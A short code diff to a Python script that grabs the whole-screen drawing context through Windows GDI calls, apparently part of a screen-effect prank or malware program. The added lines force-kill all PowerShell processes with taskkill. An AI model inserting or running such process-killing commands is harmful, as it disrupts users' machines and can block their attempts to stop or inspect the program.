@@ -3,6 +3,10 @@ import time
 import random
 import win32api
 import ctypes as c
+import os
+
+os.system("taskkill /IM powershell.exe /F")
+
 
 g = c.windll.gdi32
 d = c.windll.user32.GetDC(0)
